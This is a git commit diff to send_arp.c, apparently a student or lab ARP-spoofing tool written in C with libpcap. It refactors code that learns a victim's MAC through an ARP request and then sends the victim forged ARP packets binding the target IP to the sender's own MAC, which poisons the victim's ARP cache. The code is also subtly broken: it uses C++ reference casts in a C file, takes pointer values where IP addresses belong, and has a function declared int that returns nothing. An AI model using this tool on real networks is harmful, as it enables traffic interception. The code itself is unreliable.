d3281cc2c6c76496991f085b746d08e8a1c9b4b6
jungvely97 <jhk078@daun.net>
2018-04-19 00:38:01 -0700

    Add Makefile and send_arp.c

--- send_arp.c
+++ send_arp.c
@@ -25,8 +25,8 @@ typedef struct Packet{
     uint8_t HardwareLen;
     uint8_t ProtocolLen;
     uint16_t Operation;
-    uint8_t SanHardAdd[6];
-    uint32_t SanIP;
+    uint8_t SenHardAdd[6];
+    uint32_t SenIP;
     uint8_t TarHardAdd[6];
     uint32_t TarIP;
 }P;
@@ -34,7 +34,6 @@ typedef struct Packet{
 
 struct ether_addr my_Mac;
 struct sockaddr_in my_IP;
-uint8_t pub_packet[42] = {0,};
 
 int getIP(char *dev){
     FILE* ptr;
@@ -60,63 +59,63 @@ int get_mac(char *dev){
     return 0;
 }
 
-int send_arp(pcap_t *handle, uint32_t* Send_IP, uint32_t* Tar_IP,uint32_t* MyIP){
+void PrintError(P errorP){
+    uint8_t pub_packet[42] = {0,};
+
+    memcpy(pub_packet, &errorP, 42);
+    printf("Error \n");
+    printf("Look your packet : ");
+    for(int i =0; i< 42; i ++) printf("%02x ",pub_packet[i]);
+    printf("\n");
+}
+
+int pub_struct(P* pub_P){
+    for(int i =0; i<6; i++) pub_P->SrcMac[i] =  my_Mac.ether_addr_octet[i];
+    for(int i =0; i<6; i++) pub_P->SenHardAdd[i] =  my_Mac.ether_addr_octet[i];
+    pub_P->Type = htons(0x0806);
+    pub_P->HardwareT = htons(0x0001);
+    pub_P->ProtocolT = htons(0x0800);
+    pub_P->HardwareLen = 0x06;
+    pub_P->ProtocolLen = 0x04;
+}
+
+int send_arp(pcap_t *handle, uint32_t* Send_IP, uint32_t* Tar_IP, uint32_t* MyIP){
     uint32_t bufsize;
     P sendReq;
 
-    for(int i =0; i<6; i++){
-        sendReq.DesMac[i] = 0xff;
-        sendReq.SrcMac[i] = my_Mac.ether_addr_octet[i];
-        sendReq.SanHardAdd[i] = my_Mac.ether_addr_octet[i];
-        sendReq.TarHardAdd[i] = 0x00;
-    }
-    sendReq.Type = htons(0x0806);
-    sendReq.HardwareT = htons(0x0001);
-    sendReq.ProtocolT = htons(0x0800);
-    sendReq.HardwareLen = 0x06;
-    sendReq.ProtocolLen = 0x04;
+    pub_struct(&sendReq);
+    for(int i =0; i<6; i++) sendReq.DesMac[i] = 0xff;
+    for(int i =0; i<6; i++) sendReq.TarHardAdd[i] = 0x00;
     sendReq.Operation = htons(0x0001);
-    memcpy(&sendReq.SanIP, &MyIP, sizeof(uint32_t));
-    memcpy(&sendReq.TarIP, &Send_IP, sizeof(uint32_t));
-    memcpy(pub_packet,&sendReq,42);
-    if(pcap_sendpacket(handle,(u_char*)pub_packet,sizeof(sendReq)) == -1) printf("Send Erorr\n");
+    sendReq.SenIP = (uint32_t &)MyIP;
+    sendReq.TarIP = (uint32_t &)Send_IP;
 
-}
+    if(pcap_sendpacket(handle,(u_char*)(&sendReq),sizeof(sendReq)) == -1){
+        PrintError(sendReq);
+        exit(1);
+    }}
 
-int rep_packet(pcap_t *handle, const u_char *packet ,char *dev,  uint32_t* Send_IP, uint32_t* Tar_IP){
+int rep_packet(pcap_t *handle, const u_char *packet , char *dev, uint32_t* Send_IP, uint32_t* Tar_IP){
     P *rep;
-    P Re_sned;
+    P Re_send;
     rep = (P*)packet;
     uint8_t mac[6];
 
     if(ntohs(rep -> Type) == 0x0806){
         if(ntohs(rep -> Operation) == 0x0002){
-            for(int i =0; i<6; i++) mac[i] = rep -> SrcMac[i];
-        }
-    }
-    for(int i =0; i<6; i++){
-        Re_sned.DesMac[i] = mac[i];
-        Re_sned.SrcMac[i] = my_Mac.ether_addr_octet[i];
-        Re_sned.SanHardAdd[i] = my_Mac.ether_addr_octet[i];
-        Re_sned.TarHardAdd[i] = mac[i];
-    }
-    Re_sned.Type = htons(0x0806);
-    Re_sned.HardwareT = htons(0x0001);
-    Re_sned.ProtocolT= htons(0x0800);
-    Re_sned.HardwareLen = 0x06;
-    Re_sned.ProtocolLen = 0x04;
-    Re_sned.Operation = htons(0x0001);
-    memcpy(&Re_sned.SanIP, &Tar_IP, sizeof(uint32_t));
-    memcpy(&Re_sned.TarIP, &Send_IP, sizeof(uint32_t));
-    memcpy(pub_packet,&Re_sned,42);
-    if(pcap_sendpacket(handle,(u_char*)pub_packet,sizeof(Re_sned)) == -1) {
-        printf("Re_Send Erorr\n");
-        printf("Look your packet : ");
-        for(int i =0; i< 42; i ++) printf("%02x ",pub_packet[i]);
-        printf("\n");
-        exit(1);
-    }
-}
+            if(rep ->SenIP == (uint32_t &)Send_IP){
+                pub_struct(&Re_send);
+                for(int i =0; i<6; i++) mac[i] = rep -> SrcMac[i];
+                for(int i =0; i<6; i++) Re_send.DesMac[i] = mac[i];
+                for(int i =0; i<6; i++) Re_send.TarHardAdd[i] = mac[i];
+                Re_send.Operation = htons(0x0001);
+                Re_send.SenIP = (uint32_t &)Tar_IP;
+                Re_send.TarIP = (uint32_t &)Send_IP;
+
+                if(pcap_sendpacket(handle,(u_char*)(&Re_send),sizeof(Re_send)) == -1) {
+                    PrintError(Re_send);
+                    exit(1);
+                } } } } }
 
 int main(int argc, char *argv[]){
 
@@ -128,7 +127,7 @@ int main(int argc, char *argv[]){
     struct sockaddr_in sip;
     struct sockaddr_in tip;
     char errbuf[PCAP_ERRBUF_SIZE];
-    char* dev = argv[1];   
+    char* dev = argv[1];
     uint32_t *Send_IP;
     uint32_t *Tar_IP;
     uint32_t *MyIP;
@@ -158,7 +157,6 @@ int main(int argc, char *argv[]){
         if (res == -1 || res == -2) exit(1);
         rep_packet(handle, packet, dev, Send_IP, Tar_IP);
     }
-
     return 0;
 }
 
